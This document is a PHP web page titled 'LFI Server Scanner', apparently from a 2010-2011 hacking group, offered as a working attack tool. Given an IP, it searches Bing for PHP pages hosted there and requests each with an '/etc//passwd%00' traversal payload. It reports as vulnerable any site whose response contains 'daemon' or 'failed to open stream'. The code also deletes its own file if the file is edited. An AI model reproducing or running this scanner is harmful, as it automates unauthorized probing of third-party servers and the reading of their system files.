<html>
<head>
<meta content="fr" http-equiv="Content-Language">
<meta content="text/html; charset=windows-1252" http-equiv="Content-Type">
<title>#~ LFI Server Scanner | By [ Lagripe-Dz ]</title>
<style>*{ font-family:Verdana; font-size:12; text-decoration:none; }
input, textarea,select {
    border: 1px solid #626262;
}
</style>
</head>
<body>
<br><br><center>
<form action="" method="POST">
#~ LFI Server Scanner | By [ Lagripe-Dz ]<br><br>
IP : <input type="text" value="<? echo ($_POST['ip']) ? $_POST['ip']:"";?>" name="ip">
<select size="1" name="wht"><option>.php?page=</option><option>.php?(.*)=</option></select>
	<input type="submit" name="start" value="Start Scan ..">
	</form>
	<hr width="27%">
<?
@set_time_limit(0);



$start = new ss_bing();


if($_POST){

echo (!checkip($_POST['ip'])) ? "<b>error::IP is invalid</b><hr width=27%>":"";
echo (!extension_loaded("curl")) ? "<b>error::cURL extension required</b><hr width=27%>":"";

if(checkip($_POST['ip']) && extension_loaded("curl")){

$urls = $start->search("ip:".$_POST['ip']." ".$_POST['wht'],0);

echo "<table border='0' align=center>
<tr><td align=center><b>:: Scan Start ::</b></td></tr>";

if($_POST['wht'] == '.php?(.*)='){
foreach($urls as $url){if(eregi("=", $url) && !eregi("option=com_",$url)){$new_urls[]=$url;}}
unset($urls); $urls = $new_urls;
}

foreach($urls as $url){

echo "<tr><td>";
$tst = lfi($url);
echo ($tst) ? "# Found : ".color($tst,1):"# Not Found : ".color($url,0);
echo "</td></tr>";
flush();flush();

}
echo "
<tr><td align=center><b>:: Scan Finished ::</b></td></tr>
</table>
<hr width=27%>
";

}}
scan();

function color($url,$m0de){
  return ($m0de == 0) ? "<font color=red>$url</font>":"<a href=$url><font color=green>$url</font></a>";
}

function lfi($site){ 
$site = _Fix($site);
$marks = "failed to open stream|daemon";
if(preg_match("/$marks/i",dzcurl($site.'/etc//passwd%00',0,0,0))){
return $site.'/etc//passwd%00';
}else{
return preg_match("/$marks/i",dzcurl($site.'__dz__',0,0,0)) ? $site.'__dz__':false;
} 
}

function _Fix($site){ preg_match_all("#(.*?)?(.*?)=(.*?)#",$site,$res); return $res[2][0]."="; }

function scan(){(@count(@explode('ip',@implode(@file(__FILE__))))!= 18) ?@unlink(__FILE__):"";}

function checkip($ip){
return(preg_match("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/", $ip)==0) ? false:true;
}

# curl options

function DzCURL($url,$cookie_read,$cookie_write,$POSTs){

$curl=curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_URL,$url);
($cookie_read) ? curl_setopt($curl,CURLOPT_COOKIEFILE,getcwd().'/cookie.txt'):"";
($cookie_write) ? curl_setopt($curl,CURLOPT_COOKIEJAR,getcwd().'/cookie.txt'):"";
curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 5.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 DzCURL =)');
curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
if(is_array($POSTs)){
curl_setopt($curl,CURLOPT_POST,1);
curl_setopt($curl,CURLOPT_POSTFIELDS,$POSTs);
}
curl_setopt($curl,CURLOPT_TIMEOUT,5);

$exec=curl_exec($curl);
curl_close($curl);
return $exec;
}

# bing class ,,

class ss_bing{
  
  public function search($wht,$url_mode){ // $wht = > search  , $url_mode=1 => clean url (http://site.tld/) $url_mode=0 => not clean (http://site.tdl/page=google)
  
  $wht = str_replace(" ","+",$wht);
  $npages = 50000;
  $npage = 1;
  $allLinks = array();

  while($npage <= $npages) 
  { 
	$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'http://www.bing.com/search?q='.$wht.'&first='.$npage);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	curl_setopt($ch, CURLOPT_REFERER, 'http://www.bing.com/');
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
	$result['EXE'] = curl_exec($ch);
	$result['ERR'] = curl_error($ch);
	curl_close($ch);
 
	if (!$result['ERR'])
	{
		preg_match_all('(<div class="sb_tlst">.*<h3>.*<a href="(.*)".*>(.*)</a>.*</h3>.*</div>)siU', $result['EXE'], $findlink);
		
		for ($i = 0; $i < count($findlink[1]); $i++)
		
		$mode = ($url_mode == 1) ? $allLinks[] = $this->clean_url($findlink[1][$i]) : $allLinks[] = $findlink[1][$i];

		$npage = $npage + 10;
		if (preg_match('(first=' . $npage . '&amp)siU', $result['EXE'], $linksuiv) == 0) 
			break;		
	}
    else
		break;
    }
	
	if(count($allLinks) == 0){
	die("# Nothing Found");
	}else{
	foreach ($allLinks as $kk => $vv){ $allDmns[] = $vv; }
	return array_unique($allDmns);
	}
	}
	public function clean_url($x){ $z=parse_url($x); return $z['scheme']."://".$z['host']."/";; }
	}

?>
<center>
<a href="http://www.Sec4ever.com/">www.Sec4ever.com</a> | <a href="http://www.Lagripe-Dz.org/">
www.Lagripe-Dz.org</a><br> Algeria 2o1o-2o11
</center>

</body>
</html>